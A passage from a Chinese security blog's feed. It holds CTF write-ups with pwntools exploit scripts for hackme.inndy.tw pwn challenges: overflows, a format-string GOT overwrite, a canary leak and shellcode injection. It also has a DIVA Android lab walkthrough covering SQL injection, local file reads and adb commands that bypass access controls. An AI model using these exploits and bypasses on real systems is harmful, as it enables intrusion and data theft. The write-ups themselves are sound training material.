class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process('./toooomuch')</span></span><br><span class="line">r = remote('hackme.inndy.tw', 7702)</span><br><span class="line">elf=ELF('./toooomuch')</span><br><span class="line">bss= elf.bss()</span><br><span class="line">gets=elf.symbols['gets']</span><br><span class="line">sc=asm(shellcraft.sh())</span><br><span class="line">payload = 'a'*0x1c+p32(gets)+p32(bss)+p32(bss) <span class="comment"># junk + gets_address+ target_address  + return_address</span></span><br><span class="line"><span class="section">r.sendlineafter('passcode: ',payload)</span></span><br><span class="line">r.sendline(sc)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"># r = process(<span class="string">'./toooomuch'</span>)</span><br><span class="line">r = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7702</span>)</span><br><span class="line">elf=ELF(<span class="string">'./toooomuch'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">system</span>=elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">passcode=elf.symbols[<span class="string">'passcode'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*<span class="number">20</span>+p32(<span class="keyword">system</span>)+p32(<span class="number">0xdeadbeaf</span>)+p32(passcode)</span><br><span class="line">r.sendlineafter(<span class="string">'passcode: '</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>system函数的调用方法是：调用地址 + 返回地址 + 参数地址</p><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(&amp;s, <span class="string">"exit\n"</span>) );</span><br><span class="line">  system(<span class="string">"echo Goodbye"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的格式化字符串漏洞，代码里还有system函数，考虑将print的got地址覆盖成system的plt的地址，第二步输入/bin/sh，这样执行printf(‘/bin/sh’)的时候就执行了system(‘/bin/sh’)，可以用pwntools的fmt工具，确定一下偏移<code>AAAA%p%p%p%p%p%p%p%p</code>，<code>AAAA%7$8x</code>，偏移为7</p><p>exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r=process('./echo')</span><br><span class="line"><span class="comment"># r=remote('hackme.inndy.tw', 7711)</span></span><br><span class="line">elf=ELF('./echo')</span><br><span class="line"></span><br><span class="line">print_got=elf.got['printf']</span><br><span class="line">system_plt=elf.symbols['system']</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(7,&#123;print_got:system_got&#125;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendlineafter('\n','/bin/sh\x00')</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="smashthestack"><a href="#smashthestack" class="headerlink" title="smashthestack"></a>smashthestack</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><p>开启了cannary和nx<br>代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15600841545754.jpg" alt=""><br>先读取flag到buf，后面的read存在溢出<br>这题要利用的ssp报错的方法泄漏出flag，在ctf-wiki中有介绍：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop/#stack-smash" target="_blank" rel="noopener">stack-smash</a><br>典型的canary leak，在程序启动canary保护之后，如果发现 canary 被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">__attribute__</span> <span class="params">((noreturn)</span>) <span class="title">__stack_chk_fail</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">__attribute__</span> <span class="params">((noreturn)</span>) internal_function <span class="title">__fortify_fail</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以将<strong>libc_argv[0]覆盖为存放flag的地址，在write处下断查看</strong>libc_argv[0]的偏移，<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15600845128534.jpg" alt=""><br>flag保存在bss<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15600850313828.jpg" alt=""></p><p>所以最后exp：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7717</span>)</span><br><span class="line"># r=process(<span class="string">'./smash-the-stack'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">188</span> + p32(<span class="number">0x0804A060</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Try to read the flag\n'</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="onepunch"><a href="#onepunch" class="headerlink" title="onepunch"></a>onepunch</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><p>程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Where What?"</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = __isoc99_scanf(<span class="string">"%llx %d"</span>, &amp;v6, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *v6 = v4;<span class="comment">//往16进制数的地址写入十进制数</span></span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">255</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No flag for you"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现存在一字节的写入漏洞，但是不知道怎么利用，后来参考了其他师傅的wp，才知道怎么做。</p><p>运行查看各个段<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601549051171.jpg" alt=""><br>发现代码段为rwxp权限，结合一字节任意读写，构造一个循环，写入shellcode，再跳转到shellcode就可以了，虽然开启了nx，但是不在栈上执行，所以没关系。</p><p>改变程序流程：<br>在ida里面查看机器码，将number修改为4<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601733133129.jpg" alt=""></p><p>rename一下需要跳转到的段loc_40071D<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601734777024.jpg" alt=""></p><p>然后使用keypatch来修改汇编代码，跳转到该段，使其构成一个循环<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601736570426.jpg" alt=""></p><p>最终效果<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601737681747.jpg" alt=""><br>修改后，可以发现跳转处的机器码由75 0A变成了75 B4，所以就知道该怎么patch了，开始写exp</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"># r=process(<span class="string">'./onepunch'</span>)</span><br><span class="line">r=remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7718</span>)</span><br><span class="line"></span><br><span class="line">def patch(addr,<span class="keyword">value</span>):</span><br><span class="line">r.sendlineafter(<span class="string">'Where What?'</span>,"%s %s" % (hex(addr), str(<span class="keyword">value</span>)))</span><br><span class="line"></span><br><span class="line">patch(<span class="number">0x400768</span>,<span class="number">0xb4</span>)</span><br><span class="line"></span><br><span class="line">sc=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x400769</span> # <span class="keyword">to</span> <span class="keyword">write</span> shellcode address</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> enumerate(sc):</span><br><span class="line">patch(addr+i,ord(j))</span><br><span class="line"></span><br><span class="line">patch(<span class="number">0x400768</span>,<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><ul><li>第一次写，把jnz跳转的地址（0x400768）改为main函数的地址</li><li>之后，分多次将shellcode一字节的写入text段的一个位置</li><li>最后一次输入255就跳到shellcode了</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://bbs.pediy.com/thread-246223.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246223.htm</a></li><li><a href="https://zszcr.github.io/2018/05/09/2018-5-9-rop-%E5%92%8C-rop2-writeup/" target="_blank" rel="noopener">https://zszcr.github.io/2018/05/09/2018-5-9-rop-%E5%92%8C-rop2-writeup/</a></li><li><a href="https://github.com/taoky/my-inndy-ctf-writeup/blob/master/Pwn.md" target="_blank" rel="noopener">https://github.com/taoky/my-inndy-ctf-writeup/blob/master/Pwn.md</a></li><li><a href="http://m4x.fun/post/hackme.inndy-writeup/" target="_blank" rel="noopener">http://m4x.fun/post/hackme.inndy-writeup/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://hackme.inndy.tw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hackme.inndy&lt;/a&gt;上pwn的wp，题目难度不大&lt;/p&gt;
&lt;h2 id=&quot;catfalg&quot;&gt;&lt;a href=&quot;#catfalg&quot; c
      
    
    </summary>
    
    
      <category term="writeup" scheme="http://zerokeeper.github.io/categories/writeup/"/>
    
    
      <category term="ctf" scheme="http://zerokeeper.github.io/tags/ctf/"/>
    
      <category term="hackme" scheme="http://zerokeeper.github.io/tags/hackme/"/>
    
      <category term="pwn" scheme="http://zerokeeper.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>diva write-up</title>
    <link href="http://zerokeeper.github.io/writeup/diva-writeup.html"/>
    <id>http://zerokeeper.github.io/writeup/diva-writeup.html</id>
    <published>2019-05-08T05:32:00.000Z</published>
    <updated>2019-10-20T15:34:56.163Z</updated>
    
    <content type="html"><![CDATA[<p>diva是一个移动安全测试app，专门给开发者和安全人员演示用的app，里面包含很多的安全问题。<br>地址：<a href="https://github.com/payatu/diva-android" target="_blank" rel="noopener">https://github.com/payatu/diva-android</a><br>通过它能比较好的测试一些常见的andrid安全案例。下面是记录的测试过程。</p><h2 id="不安全的日志输出"><a href="#不安全的日志输出" class="headerlink" title="不安全的日志输出"></a>不安全的日志输出</h2><p>1.adb logcat<br>2.输入用户凭证，观察日志输出。<br>3.源码中：Log.e()</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/C6C30B66-6507-42FB-99A0-F1956E8AB124.png" alt="C6C30B66-6507-42FB-99A0-F1956E8AB124"><br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/9CD7BC64-3886-4A41-8A59-008797810824.png" alt="9CD7BC64-3886-4A41-8A59-008797810824"></p><p>查看源码中代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/FDD45D31-08AD-4CAD-8615-5AECD78275AA.png" alt="FDD45D31-08AD-4CAD-8615-5AECD78275AA"></p><h2 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h2><p>硬编码是开发人员将一些密钥等重要信息保存到了代码中。</p><p>用jd查看HardcodeActivity.class<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/092F2920-A5B9-46A0-A60C-EA0B3A9C0257.png" alt="092F2920-A5B9-46A0-A60C-EA0B3A9C0257"><br>攻击者只需要在app中输入秘钥vendorsecretkey就可以访问成功。</p><h2 id="不安全的存储1（shared-prefs-xxx-xml）"><a href="#不安全的存储1（shared-prefs-xxx-xml）" class="headerlink" title="不安全的存储1（shared_prefs/xxx.xml）"></a>不安全的存储1（shared_prefs/xxx.xml）</h2><p>不安全的数据存储也是App常见的安全问题之一，主要有三种方式：</p><p>1将敏感数据保存到配置文件中；<br>2将敏感数据保存在本地的sqlite3数据库中；<br>3将敏感数据保存在临时文件或者sd卡中。</p><p>SharedPreferences类存储的数据会以.xml的形式存储在：<br>/data/data/jakhar.aseem.diva/shared_prefs<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/3D95DF1E-F85E-4BAD-AF2C-8E19EEECC060.png" alt="3D95DF1E-F85E-4BAD-AF2C-8E19EEECC060"></p><p>源代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/66265BFC-7321-43B4-BFEF-463170B8045C.png" alt="66265BFC-7321-43B4-BFEF-463170B8045"></p><h2 id="不安全的存储2（databases-xxx-db）"><a href="#不安全的存储2（databases-xxx-db）" class="headerlink" title="不安全的存储2（databases/xxx.db）"></a>不安全的存储2（databases/xxx.db）</h2><p>用户的敏感信息存储到本地的数据库中，一般app对应的数据库目录:/data/data/apppackagename/databases<br>本例中是：/data/data/jakhar.aseem.diva/databases</p><p>如图：<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/60DD3640-5641-4909-80C5-DBC589FEAE50.png" alt="60DD3640-5641-4909-80C5-DBC589FEAE50"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/A8ECE47D-F927-452D-8C73-0DD7CB89F7DC.png" alt="A8ECE47D-F927-452D-8C73-0DD7CB89F7D"></p><p>源代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/0A79CABE-F40F-4007-B427-F19BBB4FFDC4.png" alt="0A79CABE-F40F-4007-B427-F19BBB4FFD"></p><h2 id="不安全的存储3（临时文件）"><a href="#不安全的存储3（临时文件）" class="headerlink" title="不安全的存储3（临时文件）"></a>不安全的存储3（临时文件）</h2><p>文件在 /data/data/jakhar.aseem.diva/<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/BCDC507D-CF33-47AF-94E1-AC04FEC06184.png" alt="BCDC507D-CF33-47AF-94E1-AC04FEC06184"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/BEBCB15E-852D-4518-8D3D-ABB3C781C49D.png" alt="BEBCB15E-852D-4518-8D3D-ABB3C781C49D"></p><p>源代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/CDA6AD44-0BEC-451D-82AA-05D9762C636F.png" alt="CDA6AD44-0BEC-451D-82AA-05D9762C636F"></p><h2 id="不安全的存储4（SD卡）"><a href="#不安全的存储4（SD卡）" class="headerlink" title="不安全的存储4（SD卡）"></a>不安全的存储4（SD卡）</h2><p>存储在sd卡中，漏洞代码片段：<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/181A494C-6452-4A71-B23F-29EBF62A97EB.png" alt="181A494C-6452-4A71-B23F-29EBF62A97EB"></p><h2 id="不安全的输入1（sqli）"><a href="#不安全的输入1（sqli）" class="headerlink" title="不安全的输入1（sqli）"></a>不安全的输入1（sqli）</h2><p>打开日志：adb logcat<br>输入一个单引号，在日志中可以看到报错信息，存在sql注入。<br>输入’ or ‘1’=’1，可返回所有用户密码。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/1D5958A5-2D0E-46C2-9FBF-F919275B6CC0.png" alt="1D5958A5-2D0E-46C2-9FBF-F919275B6CC0"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/33BDFA9F-7D8D-404C-AF45-AB912EA8418C.png" alt="33BDFA9F-7D8D-404C-AF45-AB912EA8418"></p><p>没有验证输入，直接带入sql语句查询</p><h2 id="不安全的输入2（读取本地文件）"><a href="#不安全的输入2（读取本地文件）" class="headerlink" title="不安全的输入2（读取本地文件）"></a>不安全的输入2（读取本地文件）</h2><p>这个activity的功能是显示用户输入的网页。如图，当你输入<a href="http://www.baidu.com它会使用一个webview去加载这个页面。" target="_blank" rel="noopener">www.baidu.com它会使用一个webview去加载这个页面。</a></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/9716BA5C-2002-46B4-BCB9-BB1E9C09F83D.png" alt="9716BA5C-2002-46B4-BCB9-BB1E9C09F83D"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/ADDEEB3E-C323-4C0F-87E0-BE46BBFAE577.png" alt="ADDEEB3E-C323-4C0F-87E0-BE46BBFAE577"></p><p>目标是使用此功能访问设备上的敏感信息。先来看看它的源代码，在InputValidation2URISchemeActivity.java中</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/A9A5CBFA-F20A-4C7D-98B5-0E67B0874872.png" alt="A9A5CBFA-F20A-4C7D-98B5-0E67B0874872"></p><p>用loadUrl方法加载用户输入的URL，这个方法也可以加载本地文件。<br>读取本地文件：file:///data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/FF2BBE17-3DE3-4DF7-A11C-AB3312A8F19A.png" alt="FF2BBE17-3DE3-4DF7-A11C-AB3312A8F19A"></p><h2 id="访问控制1（Activity-1）"><a href="#访问控制1（Activity-1）" class="headerlink" title="访问控制1（Activity 1）"></a>访问控制1（Activity 1）</h2><p>目的是在不点击此按钮的情况下访问这些信息。看看AndroidManifest.XML文件中与Vendor API Credentials activity相关的信息。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/247B1D1C-C673-4BD1-A18E-2D996FB8F53D.png" alt="247B1D1C-C673-4BD1-A18E-2D996FB8F53D"></p><p>activity是通过intent filter“保护”的。intent filter不应该被作为一种保护机制。当intent filter和像activity这样的组件一起使用时，组件是被暴露在外的。这里的activity可以被其它应用从外部加载，这是非常不安全的。我们可以通过终端中下面的命令来验证。<br>利用am(Activity Manager tool)启动暴露的组件，来绕过权限控制：<br><code>adb shell am start jakhar.aseem.diva/.APICredsActivity</code><br>或者<br> <code>adb shell am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS</code></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/755D57F6-4CCC-498C-B6E2-C20A7423BB19.png" alt="755D57F6-4CCC-498C-B6E2-C20A7423BB19"></p><p>使用drozer绕过权限<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/3D71A7C4-BFDE-492A-B438-029B37FFD30C.png" alt="3D71A7C4-BFDE-492A-B438-029B37FFD30"></p><h2 id="访问控制2（Activity-2）"><a href="#访问控制2（Activity-2）" class="headerlink" title="访问控制2（Activity 2）"></a>访问控制2（Activity 2）</h2><p>如果你是注册用户，你就能访问tweeter API的凭据。我们的目标是在不注册的情况下访问它。再次看看AndroidManifest.XML文件。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/C64F68B2-3C90-4D05-A97A-7BCF8A7EAF3C.png" alt="C64F68B2-3C90-4D05-A97A-7BCF8A7EAF3"></p><p> 尝试相同的命令发现并不能绕过，出现了pin码，看看源代码文件APICreds2Activity.java<br> <img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/03797199-3CEA-457A-8D31-2F1338293F99.png" alt="03797199-3CEA-457A-8D31-2F1338293F99"></p><p>可以看出，当我们用ADB命令启动intent时需要一个额外的布尔类型参数。下面这一行解析字符串chk_pin。</p><p><code>boolean bcheck=i.getBooleanExtra(getString(R.string.chk_pin),true);</code><br>我们可以在strings.xml中查找它实际对应的值。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/52032F75-F1A1-4B77-BC36-0B398B1B1BFD.png" alt="52032F75-F1A1-4B77-BC36-0B398B1B1BFD"></p><p>这个条件是用来验证用户是否已经注册的，可以从AccessControl2Activity.java的以下代码中看出。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/16D90B4C-2F8C-43B1-A977-372F92A0787A.png" alt="16D90B4C-2F8C-43B1-A977-372F92A0787A"></p><p>如果 chk_pin = true 说明需要现在注册，跳转到注册页面；如果 chk_pin = false 说明不需要注册，或者说已经完成注册，就会跳到认证后的界面<br>据此我们需要设置 chk_pin = false 来控制页面跳转完成破解<br>使用adb下面命令绕过<br> <code>adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity  --ez check_pin false</code><br>或者drozer命令<br><code>run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICreds2Activity --extra boolean check_pin false</code><br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/B6431D4D-521D-4FE1-BA5E-C6D0A9FB78A6.png" alt="B6431D4D-521D-4FE1-BA5E-C6D0A9FB78A6"></p><h2 id="访问控制3（Content-Providers）"><a href="#访问控制3（Content-Providers）" class="headerlink" title="访问控制3（Content Providers）"></a>访问控制3（Content Providers）</h2><p>笔记pin码保护，发现注册笔记生成一个pin码，必须通过pin码才能绕过，查看AndroidManifest.xml中关于此案例的描述<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/A8A43289-1855-4043-95BC-19EADB4F7F04.png" alt="A8A43289-1855-4043-95BC-19EADB4F7F04"></p><p>发现有个 exported = true 的 provider 注册。content providers 使用URI，通常开头是 content://<br>使用搜索功能查找关键字：content://<br>找到 NotesProvider.smali 中重要信息<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/89459067-61B0-49C3-A09D-40B228793879.png" alt="89459067-61B0-49C3-A09D-40B228793879"></p><p>根据以上smail代码，找到路径<br><code>content://jakhar.aseem.diva.provider.notesprovider/notes</code><br>根据xml中属性信息，这个content 是exported = true 的，也就意味着可以直接外部访问<br>输入命令<br><code>adb shell content query  --uri content://jakhar.aseem.diva.provider.notesprovider/notes</code><br>就可以查询到认证后的私有笔记信息<br><img 